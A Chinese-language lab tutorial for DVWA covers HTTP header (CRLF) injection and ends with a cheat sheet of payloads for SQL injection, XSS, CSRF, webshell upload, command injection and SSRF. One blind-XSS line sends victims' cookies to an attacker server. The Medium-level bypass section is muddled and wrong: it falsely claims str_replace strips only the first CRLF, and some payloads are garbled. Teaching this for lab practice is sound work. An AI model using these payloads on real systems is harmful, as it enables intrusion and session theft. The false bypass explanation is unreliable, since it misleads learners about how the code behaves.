# Day 18：HTTP Header Injection HTTP 头注入 + DVWA 全模块彩蛋查漏

> **🎯 靶场实战** | 难度：⭐⭐⭐ | 预计学习：60 分钟

---

# 第18章 HTTP 头注入 + DVWA 彩蛋查漏补缺（附赠考前速通 CheatSheet 📚）

哈喽各位小伙伴们大家好！👋 欢迎来到第18章！

上一章 Day17 我们学会了开放式重定向这个"钓鱼黄金帮凶"，一张 6 姿势绕过速查表让你 CTF 和 CISP-PTE 直接捡分。今天这一章我们做两件事：

**① 学习 DVWA 里最后一个"独立漏洞模块"——HTTP Header Injection（HTTP 头注入，也叫 CRLF 注入）。** 这个漏洞跟 Day17 的 Open Redirect 是"好兄弟"——它们都出在"服务器把用户输入拼到 HTTP 响应头里"这个操作上。只不过 Day17 拼的是 Location，今天拼的是 Set-Cookie、Host、Referer 等等。**学好这个漏洞，你就能理解 WAF 为啥总对 `\r\n` 这么敏感！** 😎

**② DVWA 彩蛋大查漏！** 从 Day5 到 Day18，我们一共啃下了 DVWA 16+ 个模块，但还有几个"Day7~Day11 里提了一嘴但没展开"的"边角料漏洞"（比如 DOM XSS 的进阶 payload、Stored XSS 的盲打、CSRF 的 GET 版绕过、文件上传 `%00` 截断），今天一口气补完，确保你去打 DVWA 时**不会遇到"我没学过的关卡"**！🎯

而且今天的结尾，我还会送你一份**《DVWA 全模块 Low/Med/High 级别 Payload 速通 CheatSheet》**——打印出来睡前背一遍，机试、CTF、面试直接上场！绝对干货，坐稳扶好！🚀

---

## 18.1 前置知识：到底什么是 CRLF？为什么它能"注入 Header"？ ⚙️

### 18.1.1 大白话比喻：快递单上的"多打印一行字段"

把 HTTP 响应想象成一张快递单——上面一行一行写着：

```
┌──────────────────────────────────────┐
│ 📦 HTTP 响应快递单                    │
│ From: 服务器                         │
│ To:   浏览器                         │
│ 状态码: 200 OK                        │
│ Set-Cookie: theme=light          ← 第1个头 │
│ Set-Cookie: user_pref=zh_CN      ← 第2个头 │
│ Content-Type: text/html          ← 第3个头 │
│                                    ← 【空行】头和 Body 的分界！！重要！│
│ <html><body>Hello!</body></html>  ← Body 部分 │
└──────────────────────────────────────┘
```

HTTP 协议规定：
- **头和头之间**：用 **CRLF（回车+换行）** 分隔。CRLF = `\r\n`（十六进制 `0D 0A`，URL 编码 `%0d%0a`）
- **头和 Body 之间**：必须有 **两个连续的 CRLF（=一个空行）**，表示"头写完了，下面是 Body"

**那"头注入漏洞"是怎么来的呢？**

想象快递单打印机的一个字段是用户写的。用户本来写的是 `"zh_CN"`，结果他写成了：

```
zh_CN\r\nSet-Cookie: stolen_session=hacker_123456
```

打印机一看是 CRLF，**就以为这行写完了，下一行是新的头**！结果打印出来就变成：

```
Set-Cookie: user_pref=zh_CN
Set-Cookie: stolen_session=hacker_123456     ← 【多出来的假 Cookie！】黑客注入的！
Content-Type: text/html
```

**这就是"HTTP 头注入 = CRLF 注入 = Response Splitting（响应拆分）"** 的本质——**用户输入里的 `\r\n`（%0d%0a）被服务器当成"一行头写完了"，从而允许攻击者往 HTTP 响应头里加任意头、任意 Body！** 就这么简单的一个"换行符被当真"，就能干出一堆坏事👇

### 18.1.2 CRLF 注入能做啥？4 大真实攻击场景

| 场景 | 操作方式 | 真实危害 |
|---|---|---|
| 🔥 **XSS（最常用）** | 两个 CRLF 跳到 Body，直接写 `<script>` | 偷 Cookie、挂马、钓鱼 — 跟 Day8 一样 |
| 🔥 **Session 固定攻击** | 注入 `Set-Cookie: PHPSESSID=我知道的固定值` | 受害者用了黑客预设的 Session，一登录黑客就用同样 Session 登录 |
| 🔥 **任意 Location 跳转（= Day17 漏洞）** | 注入 `Location: https://evil.com` + CRLF | 重定向钓鱼 — 跟 Day17 等价 |
| 🔥 **绕过 WAF 检测** | 把真正的 SQL/XSS payload 写到"注入出的第二行 Body"里，WAF 只校验原始参数 | 绕狗（绕过安全狗、云WAF）神器之一 |

### 18.1.3 一眼看懂 CRLF 注入链路图

<svg width="100%" viewBox="0 0 900 450" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
  <rect x="0" y="0" width="900" height="450" rx="14" fill="#ecfeff" stroke="#06b6d4" stroke-width="2"/>
  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#0e7490" font-weight="bold">🧩 CRLF 注入原理：一个换行符如何"偷偷多加一个 Cookie / XSS Payload"</text>
  <!-- 上半部分：正常响应 -->
  <g transform="translate(30,70)">
    <rect x="0" y="0" width="420" height="360" rx="12" fill="white" stroke="#16a34a" stroke-width="2.5"/>
    <rect x="0" y="0" width="420" height="45" rx="12" fill="#16a34a"/>
    <rect x="0" y="32" width="420" height="13" fill="#16a34a"/>
    <text x="210" y="27" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" font-weight="bold" fill="white">✅ 正常情况：用户输入 = zh_CN</text>
    <text x="20" y="85" font-family="Microsoft YaHei" font-size="13" fill="#14532d" font-weight="bold">PHP 代码：</text>
    <rect x="20" y="95" width="380" height="36" rx="6" fill="#0f172a"/>
    <text x="30" y="118" font-family="Consolas" font-size="12" fill="#7dd3fc">header("Set-Cookie: user_pref=".$_GET['lang']);</text>
    <text x="20" y="165" font-family="Microsoft YaHei" font-size="13" fill="#14532d" font-weight="bold">浏览器收到的响应头（2行）：</text>
    <g transform="translate(20,175)">
      <rect x="0" y="0" width="380" height="150" rx="8" fill="#ecfdf5" stroke="#16a34a" stroke-width="2"/>
      <text x="15" y="28" font-family="Consolas" font-size="13" fill="#0f172a">HTTP/1.1 200 OK</text>
      <rect x="10" y="35" width="360" height="28" rx="4" fill="none" stroke="#16a34a" stroke-dasharray="4 3"/>
      <text x="20" y="54" font-family="Consolas" font-size="13" fill="#15803d" font-weight="bold">① Set-Cookie: user_pref=zh_CN</text>
      <text x="15" y="88" font-family="Consolas" font-size="13" fill="#0f172a">Content-Type: text/html</text>
      <line x1="10" y1="102" x2="370" y2="102" stroke="#16a34a" stroke-width="2"/>
      <text x="15" y="122" font-family="Microsoft YaHei" font-size="11" fill="#166534">【空行 = 头结束】</text>
      <text x="15" y="140" font-family="Consolas" font-size="11" fill="#0f172a">&lt;body&gt;Page...&lt;/body&gt;</text>
    </g>
  </g>
  <!-- 下半部分：注入 -->
  <g transform="translate(460,70)">
    <rect x="0" y="0" width="420" height="360" rx="12" fill="white" stroke="#dc2626" stroke-width="2.5"/>
    <rect x="0" y="0" width="420" height="45" rx="12" fill="#dc2626"/>
    <rect x="0" y="32" width="420" height="13" fill="#dc2626"/>
    <text x="210" y="27" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" font-weight="bold" fill="white">❌ 漏洞情况：用户输入带 %0d%0a 换行</text>
    <text x="20" y="85" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d" font-weight="bold">用户恶意输入：</text>
    <rect x="20" y="95" width="380" height="36" rx="6" fill="#0f172a"/>
    <text x="30" y="118" font-family="Consolas" font-size="12" fill="#fca5a5">lang=zh_CN%0d%0aSet-Cookie:PHPSESSID=HACKED123</text>
    <text x="20" y="165" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d" font-weight="bold">浏览器收到的响应头（3行！被多加了1行）：</text>
    <g transform="translate(20,175)">
      <rect x="0" y="0" width="380" height="150" rx="8" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
      <text x="15" y="28" font-family="Consolas" font-size="13" fill="#0f172a">HTTP/1.1 200 OK</text>
      <rect x="10" y="35" width="360" height="28" rx="4" fill="none" stroke="#16a34a" stroke-dasharray="4 3"/>
      <text x="20" y="54" font-family="Consolas" font-size="13" fill="#15803d">① Set-Cookie: user_pref=zh_CN</text>
      <rect x="10" y="60" width="360" height="28" rx="4" fill="#fee2e2" stroke="#dc2626" stroke-width="2.5"/>
      <text x="20" y="79" font-family="Consolas" font-size="13" fill="#dc2626" font-weight="bold">② ⚠️ 注入！Set-Cookie:PHPSESSID=HACKED123</text>
      <text x="15" y="110" font-family="Consolas" font-size="13" fill="#0f172a">Content-Type: text/html</text>
      <line x1="10" y1="124" x2="370" y2="124" stroke="#dc2626" stroke-width="2"/>
      <text x="15" y="140" font-family="Microsoft YaHei" font-size="11" fill="#7f1d1d">【头结束 → Body 正常发送】</text>
    </g>
  </g>
</svg>

---

## 18.2 正式闯关：DVWA HTTP Header Injection Low 级别 🔓

### 18.2.1 正常玩家视角：页面怎么触发头注入？

登录 DVWA → Security 切 **low** → 左侧找到 **HTTP Header Injection（部分 DVWA 版本叫 "HTTP Response Splitting"）** 模块。

你会看到一个下拉框或者输入框，选择"页面语言（Select Language）"：默认有 `zh_CN`、`en_US`、`ja_JP` 三个选项，点 Submit 后页面会变成对应语言。

抓包（F12 → Network）看一下这个请求的响应，会发现服务器返回了一个 **Set-Cookie: dvwaLang=zh_CN**（或其他选项）。这就是我们在比喻里"快递单的 Set-Cookie 字段"——**服务器直接把用户提交的 lang 参数拼到了 Set-Cookie 响应头里！** 漏洞就在这儿。

### 18.2.2 Low 源码 + Payload 实操

```php
<?php
// vulnerabilities/http_header_injection/source/low.php
if (array_key_exists("lang", $_GET) && $_GET['lang'] != NULL) {
    // ⚠️ 问题：没有任何过滤就拼进 header()！
    header("Set-Cookie: dvwaLang=" . $_GET['lang']);
}
?>
```

**漏洞实锤：** `$_GET['lang']` 直接进 `Set-Cookie`，啥都没过滤！那我们直接往里面塞 `%0d%0a`（换行符的 URL 编码）就能加任意头了。

#### 攻击 ①：注入一个假 Session Cookie（Session 固定）

```
✅ Payload（Burp/URL 提交）：
?vulnerabilities/http_header_injection/source/low.php?lang=zh_CN%0d%0aSet-Cookie:PHPSESSID=HACKER_KNOWS_THIS_ID

👉 浏览器收到 2 个 Set-Cookie！
   Set-Cookie: dvwaLang=zh_CN
   Set-Cookie: PHPSESSID=HACKER_KNOWS_THIS_ID  ← 【注入成功！被加了个假 Session】
```

**Session 固定攻击后续：** 黑客把这个 URL 发给受害者，受害者点了之后，他的 PHPSESSID 就被改成"HACKER_KNOWS_THIS_ID"（黑客知道的 ID）；受害者登录之后，黑客**用同一个 PHPSESSID 去访问后台**，直接就是受害者身份！（具体流程 Day13 Weak Session 里讲过，这两个漏洞经常串起来用）

#### 攻击 ②：注入两个 CRLF 跳到 Body，打 XSS！

这个最狠！**两个 `%0d%0a` = 头和 Body 之间的空行**。空行之后的内容，浏览器会当成 HTML Body 解析——所以我们直接在里面写 `<script>`！

```
✅ XSS Payload（注意！前面是 2 组 %0d%0a，跳过 Header 的末尾空行）：
/lang.php?lang=zh_CN%0d%0a%0d%0a<script>alert(document.cookie)</script>

👉 服务器返回的响应长这样：
   HTTP/1.1 200 OK
   Set-Cookie: dvwaLang=zh_CN
                                   ← 第 1 个 CRLF 让这行空了
                                   ← 第 2 个 CRLF 让这行也空了 = 头结束！
   <script>alert(document.cookie)</script>   ← 【浏览器当成 HTML Body 解析！】
   <html>原来的页面...</html>

👉 结果：弹窗！！🎉 100% 触发反射型 XSS（不受任何 CSP 影响，因为我们直接在 <head> 之前写 script）
```

### 18.2.3 Low 源码解析 + 修复方向

```php
<?php
if (array_key_exists("lang", $_GET) && $_GET['lang'] != NULL) {
    header("Set-Cookie: dvwaLang=" . $_GET['lang']);
    // ⚠️ 问题1：没有 urlencode — Cookie 值的特殊字符必须编码
    // ⚠️ 问题2：没有移除 / 替换 CRLF 字符
    // ⚠️ 问题3：没有白名单校验（应该只允许 zh_CN/en_US/ja_JP 三种）
}
?>
```

**修复三件套（Low → Impossible）：** 详见 18.5 节 Impossible 正确写法。

---

## 18.3 Medium 级别：用 `str_replace` 删 CRLF？双写绕过 + 多编码绕过 💣

### 18.3.1 Medium 源码（开发者的"自以为安全的修复"）

```php
<?php
if (array_key_exists("lang", $_GET) && $_GET['lang'] != NULL) {
    $lang = $_GET['lang'];
    // 开发者：嗯！我把 "\r\n"、"\r"、"\n" 三个组合都替换掉！这下安全了吧？😎
    $lang = str_replace(array("\r\n", "\r", "\n"), '', $lang);
    header("Set-Cookie: dvwaLang=" . $lang);
}
?>
```

开发者的想法很朴素："我把换行符全删了，你怎么注入？"——**但他只执行了一次 str_replace！** 于是经典的 **双写绕过（Double Write）** 就来了👇

### 18.3.2 双写绕过：`%0d%0d%0a%0a` = `\r\r\n\n`

原理跟 Day9 命令注入里 `&&` 被删了就写 `&;&` 一个道理——**删完第一次，中间剩下来的字符又拼出一个新的 `\r\n`**。

```
【原始恶意输入】
lang=zh_CN%0d%0d%0a%0aSet-Cookie:PHPSESSID=xxx
解码后："zh_CN\r\r\n\nSet-Cookie:PHPSESSID=xxx"

【第一次 str_replace 处理后】
删除 "\r\n" → zh_CN\r   \nSet-Cookie...  中间的 \r\n 被干掉了，剩下 \r 和 \n！
等等？换个更清晰的写法：用 \r\r\n 这样的重叠！
  用户输入：\r \r \n
  位置 2,3 = \r\n 被删掉后 → 剩下的位置 1 的 \r 还在！（不够，我们要完整 \r\n）
更稳的写法：直接写 \r\n 拆成两半中间加被删的字符？
→ 最佳实战双写：写 2 对 \r\n = \r\n\r\n
  str_replace(array("\r\n"), '', "\r\n\r\n") 执行一次 → 先删前 2 字节 → 剩后面的 \r\n！
  因为 str_replace 默认只扫一遍！
```

**实操 Payload（双写 `%0d%0a` 两遍）：**

```
✅ Medium 绕过 Payload：
/lang.php?lang=zh_CN%0d%0a%0d%0a<script>alert(1)</script>
                       ↑↑     ↑↑
                       删了第1组 → 还剩第2组 = 依然有一个换行！

👉 删除逻辑(只执行一遍扫描替换)：
   字符串：[0d 0a] [0d 0a] <script>...
   ↑ 扫描到第一个 [0d 0a]，替换为空，结果变成 [0d 0a] <script>...
   str_replace 不再"回溯"重新扫剩余字符！剩下的 [0d 0a] 原样保留！
   → 依然成功换行！XSS 成功！🎉
```

> 💡 **零基础理解为什么双写能绕：** 你就把 str_replace 想成"扫地机器人"——它从左往右走一遍，扫到 `\r\n` 就捡走，然后接着往下走。你在它要经过的路上放两个"垃圾 `\r\n` 叠在一起"，它捡走第一个后，**不会回头再看刚刚的位置**，所以第二个垃圾就留下来了。🤣

### 18.3.3 进阶绕过：用其他编码方式骗过 `str_replace`

现代 Web 服务器解码链很长（URL 解码 1 次 → 多层代理再解码 1 次 → …），所以还有两种常用绕过（真实 WAF 场景）：
- **① 双重 URL 编码：** CRLF 本来是 `%0d%0a`，再编码一次 `%` → `%25`，结果就是 `%250d%250a`。有些服务器会解码两次，第二次解码才真正变成 `\r\n`，而 PHP 的 `$_GET` 只解码了一次，所以 `str_replace` 没找到"明文 \r\n"，就放过去了。
- **② 用 \r 不带 \n：** 某些老版本浏览器（老 IE、老 Chrome）会把单独一个 `\r`（%0d）也当成换行符处理，所以你写 `%0dSet-Cookie:...` 在部分环境里也能成。

---

## 18.4 High 级别：只允许白名单里的 3 种语言？完美！ ✨

```php
<?php
if (array_key_exists("lang", $_GET) && $_GET['lang'] != NULL) {
    $lang = $_GET['lang'];
    // 先删 CRLF（多重防御）
    $lang = preg_replace('/[\r\n]+/m', '', $lang);  // 正则替换所有 CR/LF（比 str_replace 狠）
    // ✅ 再用白名单严格校验
    $allow = array("zh_CN", "en_US", "ja_JP");
    if (in_array($lang, $allow, true)) {
        // ✅ 再 urlencode 一次保证安全输出
        header("Set-Cookie: dvwaLang=" . urlencode($lang));
    }
}
?>
```

**High 级别的"三层铜墙铁壁"（已经非常接近安全了）：**
1. **正则 `/[\r\n]+/m` 清除 CR/LF**：正则会**反复扫描**直到没有，双写也无效
2. **in_array 白名单严格匹配**：lang 不是 zh_CN / en_US / ja_JP 三者之一？直接拒绝，**根本不进 header()**
3. **urlencode 输出编码**：就算白名单里的内容万一有特殊字符，`urlencode` 也会把 `=`、`;`、空格、CRLF 等 Cookie 分隔符全编码掉，彻底防注入

> 🔥 **为什么 High 级还不是 Impossible？** 因为它用的是 `in_array + urlencode`（依然是"相对安全"）。
> **Impossible 级别（完美无瑕）** 会连"用户输入的字符串"都放弃不用，直接**通过数组下标去取"服务器写死的安全字符串"**，彻底 0 信任用户输入。👇

---

## 18.5 Impossible 级别："服务器自己写的值"才是唯一可信的值 ✅

```php
<?php
$langAllow = [
    "1" => "zh_CN",
    "2" => "en_US",
    "3" => "ja_JP",
];
if (array_key_exists("lang", $_GET) && $_GET['lang'] != NULL) {
    $idx = $_GET['lang'];
    // 只接受 1 / 2 / 3 三个数字！
    if (!array_key_exists($idx, $langAllow)) {
        header("Set-Cookie: dvwaLang=" . urlencode($langAllow["1"]));  // 默认中文
    } else {
        // 最终写入 Cookie 的是"我们数组里写死的值"，跟用户输入一毛钱关系没有！
        header("Set-Cookie: dvwaLang=" . urlencode($langAllow[$idx]));
    }
}
?>
```

**Impossible 为什么无懈可击？一句话总结：**
> **"最终拼到 HTTP 响应头里的字符串，100% 是开发者在代码里写死的常量"** — 不是从用户输入拼出来的。

这是所有"拼接类漏洞"（SQLi / XSS / 头注入 / 命令注入）的终极防御心法：**能不用用户输入就不用；非用不可时，用"用户输入做索引→服务器查表取常量"的间接模式（也叫 Idirection 模式），把不可信的输入和真实的输出彻底隔离。** 💎

---

## 18.6 DVWA 彩蛋查漏补缺：Day5~Day17 没讲的"边角料"全补齐 🎁

到这一章为止，我们已经通关了 DVWA 所有"主要模块"，但还有一些"高频出现但篇幅较小"的知识点放在 CTF / 机试里特别容易考，但在之前章节里只是提了一嘴。现在我们**用"题 + Payload + 一句话原理"的形式一次性补齐**，确保你 DVWA 里**没有未覆盖的考点**：

### 🎁 彩蛋 1：DOM XSS 的另类 Payload（不依赖 script 标签）

**场景：** 某页面 `?default=<选单默认值>`，PHP 里把它直接拼到 JS 里：`document.write("<select><option value='".$_GET['default']."'>默认</option>...")`

**普通 XSS 会写：**
```
default='</option></select><script>alert(1)</script>
```
**但如果 CSP `script-src 'self'` 拦截了 <script>，换事件触发 DOM XSS：**
```
default='></option><img src=x onerror=alert(document.cookie)>
```
**或者直接用 `javascript:` 伪协议 + `<a>` 自动点：**
```
default='></option><a href="javascript:alert(1)" id="x">点我</a><script>document.getElementById("x").click()</script>
```

### 🎁 彩蛋 2：Stored XSS 盲打（页面只显示"留言已提交，不显示内容"）

**场景：** 某后台管理员能看到所有用户的留言，用户侧看不到。提交 payload 没弹窗？**不是没触发，是你不是目标（管理员）！** 这叫 XSS 盲打。

**盲打标准做法（Day8 提过但没给代码）：** 提交一个外带 Cookie 的 payload，等管理员点：
```html
<script>new Image().src='http://我自己的服务器/steal.php?c='+document.cookie</script>
```
或者用公共盲打平台（比如 xss.ht / xss.pt），直接复制它们给你的 payload 粘贴。**真实渗透测试，Stored XSS 盲打拿到后台管理员 Cookie，常常是整个渗透链的入口点！** 🔑

### 🎁 彩蛋 3：CSRF 不只有 POST，GET 版的 CSRF 攻击链

Day11 CSRF 我们重点讲了 POST 型的"构造表单自动提交"。但有些开发者把"危险操作"（比如改密码、加管理员）写在 GET 请求里（就像 Day12 CAPTCHA Low 那样），那 payload 更简单：**直接把危险 URL 写在 `<img src>` 的地址里**，用户打开邮件/文章就自动打了：
```html
<img src="http://target/dvwa/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change" style="display:none">
```
> 🔑 口诀：**POST 型 CSRF 用 `<form>` 自动提交；GET 型 CSRF 用 `<img>` 自动加载**，两个都要会！

### 🎁 彩蛋 4：PHP 版文件上传 `%00` 截断（老版本 PHP < 5.3.4 专属）

Day9 文件上传我们讲了改后缀、改 Content-Type、改双写绕黑名单。**还有一个历史上大名鼎鼎、但新版本 PHP 被修掉的考点：`%00` 空字节截断。**

**原理：** PHP 底层用 C 语言的字符串函数，C 语言字符串以 `\0`（ASCII 0，URL 编码 `%00`）结束。所以 `shell.php%00.gif` 在 C 层看来是 `shell.php\0.gif` = **读到 `\0` 就停**，真正保存下来的文件名是 `shell.php`！

**使用条件：** ① PHP 版本 < 5.3.4；② 上传目录由 `$_POST['path']` 可控。DVWA 文件上传部分版本有这个彩蛋，**条件全满足时 payload = shell.php%00.gif**，直接绕后缀白名单。CTF 老题常客，看到 PHP 版本 < 5.3 先想它！🚀

### 🎁 彩蛋 5：命令注入绕过空格过滤的 4 个小技巧

Day9 命令注入如果服务器把空格 ban 了（`preg_replace('/ +/')`），用这 4 个代替：
```bash
cat</etc/passwd         # ① <  重定向符号当分隔符（不需要空格）
cat$IFS/etc/passwd      # ② $IFS = 内部字段分隔符，Shell 当空格用
cat${IFS}/etc/passwd    # ③ 跟上面等价，加 {} 防变量名歧义
{cat,/etc/passwd}       # ④ Bash 大括号展开，逗号即空格
```
> CTF 里这 4 个是"绕空格过滤"的标准答案，考到直接默写。✨

### 🎁 彩蛋 6：SQL 注入绕单引号过滤 → 十六进制 / CHAR() 技巧

Day10 SQL 注入如果开发者把 `'` 过滤了（`preg_replace('/\'/', '')`），我们的 `WHERE user='admin'` 写不出来？**用字符串的十六进制表示！**

```sql
原本（有单引号）：SELECT password FROM users WHERE user='admin'
绕过（十六进制）：SELECT password FROM users WHERE user=0x61646d696e
                                    ↑↑↑ 'a'=61 'd'=64 'm'=6d 'i'=69 'n'=6e
或者用 CHAR()：    WHERE user=CHAR(97,100,109,105,110)
```
MySQL 直接把 0x 开头的十六进制解释成字符串，**全程没有用单引号**！直接绕过所有 `'` 过滤。🚀

---

## 18.7 超级大礼包：DVWA 全模块 Low/Med/High Payload 速通 CheatSheet 📚（考前必背）

> 🚨 **CISP-PTE / CTF 机试进场前最后 10 分钟，背这张表就够了！** 我把从 Day5 到今天 Day18 的所有经典 Payload 浓缩成一张表，Low/Med/High 三档都给你列好。用的时候直接套！💯

<svg width="100%" viewBox="0 0 900 530" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
  <defs>
    <linearGradient id="g18cs" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#1e40af"/>
      <stop offset="100%" stop-color="#0ea5e9"/>
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="900" height="530" rx="14" fill="#0f172a" stroke="#1e293b" stroke-width="3"/>
  <rect x="0" y="0" width="900" height="55" rx="14" fill="url(#g18cs)"/>
  <text x="450" y="37" text-anchor="middle" font-family="Microsoft YaHei" font-size="22" fill="white" font-weight="bold">📚 DVWA 全模块速通 CheatSheet（Low / Med / High 三级 Payload 一览表）</text>
  <!-- 表格 -->
  <g font-family="Consolas" font-size="11.5">
    <!-- 表头 -->
    <rect x="15" y="68" width="870" height="34" rx="6" fill="#1e3a8a"/>
    <text x="55" y="90" text-anchor="middle" fill="#e0f2fe" font-family="Microsoft YaHei" font-weight="bold" font-size="12.5">模块</text>
    <text x="235" y="90" text-anchor="middle" fill="#bbf7d0" font-family="Microsoft YaHei" font-weight="bold" font-size="12.5">Low ✅ 一键打穿</text>
    <text x="495" y="90" text-anchor="middle" fill="#fde68a" font-family="Microsoft YaHei" font-weight="bold" font-size="12.5">Medium 💡 绕过思路</text>
    <text x="735" y="90" text-anchor="middle" fill="#fecaca" font-family="Microsoft YaHei" font-weight="bold" font-size="12.5">High ⚔️ 终极绕过</text>
    <!-- 数据行1 Brute Force -->
    <rect x="15" y="104" width="870" height="55" rx="6" fill="#1e293b"/>
    <rect x="15" y="104" width="95" height="55" fill="none" stroke="#475569"/>
    <text x="62" y="137" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">暴力破解</text>
    <rect x="110" y="104" width="175" height="55" fill="none" stroke="#475569"/>
    <text x="197" y="137" text-anchor="middle" fill="#86efac">Burp Intruder + rockyou.txt</text>
    <rect x="285" y="104" width="310" height="55" fill="none" stroke="#475569"/>
    <text x="440" y="137" text-anchor="middle" fill="#fde68a">Burp Intruder Clusterbomb 爆破 用户名×密码</text>
    <rect x="595" y="104" width="290" height="55" fill="none" stroke="#475569"/>
    <text x="740" y="137" text-anchor="middle" fill="#fecaca">先 GET 取 user_token → 再 POST（Pitchfork + 正则 grep token）</text>
    <!-- 行2 SQLi -->
    <rect x="15" y="161" width="870" height="55" rx="6" fill="#0f172a"/>
    <rect x="15" y="161" width="95" height="55" fill="none" stroke="#475569"/>
    <text x="62" y="194" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">SQLi 显注</text>
    <rect x="110" y="161" width="175" height="55" fill="none" stroke="#475569"/>
    <text x="197" y="194" text-anchor="middle" fill="#86efac">1' UNION SELECT 1,2,3,database()-- </text>
    <rect x="285" y="161" width="310" height="55" fill="none" stroke="#475569"/>
    <text x="440" y="194" text-anchor="middle" fill="#fde68a">POST 数字型：不用引号；十六进制绕引号 0x61646d696e</text>
    <rect x="595" y="161" width="290" height="55" fill="none" stroke="#475569"/>
    <text x="740" y="194" text-anchor="middle" fill="#fecaca">先取 user_token + SQLmap --csrf-token --cookie</text>
    <!-- 行3 SQLi Blind -->
    <rect x="15" y="218" width="870" height="55" rx="6" fill="#1e293b"/>
    <rect x="15" y="218" width="95" height="55" fill="none" stroke="#475569"/>
    <text x="62" y="251" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">SQL 盲注</text>
    <rect x="110" y="218" width="175" height="55" fill="none" stroke="#475569"/>
    <text x="197" y="251" text-anchor="middle" fill="#86efac">1' AND ASCII(SUB(DATABASE(),1,1))=100-- </text>
    <rect x="285" y="218" width="310" height="55" fill="none" stroke="#475569"/>
    <text x="440" y="251" text-anchor="middle" fill="#fde68a">POST 数字型 1 AND IF(substr(...),SLEEP(3),0)</text>
    <rect x="595" y="218" width="290" height="55" fill="none" stroke="#475569"/>
    <text x="740" y="251" text-anchor="middle" fill="#fecaca">每次先 GET 拿 token + --delay=3 时间盲注</text>
    <!-- 行4 XSS Reflected -->
    <rect x="15" y="275" width="870" height="55" rx="6" fill="#0f172a"/>
    <rect x="15" y="275" width="95" height="55" fill="none" stroke="#475569"/>
    <text x="62" y="308" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">反射型 XSS</text>
    <rect x="110" y="275" width="175" height="55" fill="none" stroke="#475569"/>
    <text x="197" y="308" text-anchor="middle" fill="#86efac">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</text>
    <rect x="285" y="275" width="310" height="55" fill="none" stroke="#475569"/>
    <text x="440" y="308" text-anchor="middle" fill="#fde68a">&lt;img src=x onerror=alert(1)&gt;（绕 script 黑名单）</text>
    <rect x="595" y="275" width="290" height="55" fill="none" stroke="#475569"/>
    <text x="740" y="308" text-anchor="middle" fill="#fecaca">HTML 实体编码：&lt;svg onload=alert(1)&gt;</text>
    <!-- 行5 XSS Stored -->
    <rect x="15" y="332" width="870" height="55" rx="6" fill="#1e293b"/>
    <rect x="15" y="332" width="95" height="55" fill="none" stroke="#475569"/>
    <text x="62" y="365" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">存储型 XSS</text>
    <rect x="110" y="332" width="175" height="55" fill="none" stroke="#475569"/>
    <text x="197" y="365" text-anchor="middle" fill="#86efac">留言板写 script payload → 刷新每个访客中弹</text>
    <rect x="285" y="332" width="310" height="55" fill="none" stroke="#475569"/>
    <text x="440" y="365" text-anchor="middle" fill="#fde68a">拆分写：<scr<script>ipt>...</scr</script>ipt> 双写绕过滤</text>
    <rect x="595" y="332" width="290" height="55" fill="none" stroke="#475569"/>
    <text x="740" y="365" text-anchor="middle" fill="#fecaca">短 payload + 提交前先截包移除长度 maxlength 属性</text>
    <!-- 行6 文件上传 -->
    <rect x="15" y="389" width="870" height="55" rx="6" fill="#0f172a"/>
    <rect x="15" y="389" width="95" height="55" fill="none" stroke="#475569"/>
    <text x="62" y="422" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">文件上传</text>
    <rect x="110" y="389" width="175" height="55" fill="none" stroke="#475569"/>
    <text x="197" y="422" text-anchor="middle" fill="#86efac">直接传 shell.php，Content-Type 改 image/png</text>
    <rect x="285" y="389" width="310" height="55" fill="none" stroke="#475569"/>
    <text x="440" y="422" text-anchor="middle" fill="#fde68a">双后缀 shell.php.jpg；抓包修改 MIME 类型</text>
    <rect x="595" y="389" width="290" height="55" fill="none" stroke="#475569"/>
    <text x="740" y="422" text-anchor="middle" fill="#fecaca">%00 截断（PHP<5.3.4）或图片马 + 文件包含</text>
    <!-- 行7 命令注入 / CSRF / Redirect... -->
    <rect x="15" y="446" width="870" height="65" rx="6" fill="#1e293b"/>
    <rect x="15" y="446" width="95" height="65" fill="none" stroke="#475569"/>
    <text x="62" y="474" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">命令注入</text>
    <text x="62" y="498" text-anchor="middle" fill="#e2e8f0" font-family="Microsoft YaHei" font-size="11.5">& 越权/SSRF</text>
    <rect x="110" y="446" width="175" height="65" fill="none" stroke="#475569"/>
    <text x="197" y="472" text-anchor="middle" fill="#86efac">127.0.0.1 & cat /etc/passwd</text>
    <text x="197" y="496" text-anchor="middle" fill="#86efac">CSRF：<form action=chgpwd auto submit></text>
    <rect x="285" y="446" width="310" height="65" fill="none" stroke="#475569"/>
    <text x="440" y="472" text-anchor="middle" fill="#fde68a">127.0.0.1 | dir（用管道代替 &）绕 & 过滤</text>
    <text x="440" y="496" text-anchor="middle" fill="#fde68a">Redirect：白名单@evil.com（@ 大法）</text>
    <rect x="595" y="446" width="290" height="65" fill="none" stroke="#475569"/>
    <text x="740" y="472" text-anchor="middle" fill="#fecaca">;DIR${IFS}C:\绕空格；SSRF 用 dict:///gopher:// 协议</text>
    <text x="740" y="496" text-anchor="middle" fill="#fecaca">Header Inj：双写 %0d%0a%0d%0a 绕一次 str_replace</text>
  </g>
  <!-- 底部提示 -->
  <rect x="15" y="513" width="870" height="12" rx="6" fill="#0ea5e9" opacity="0.3"/>
</svg>

> 📥 **怎么用这张表？**
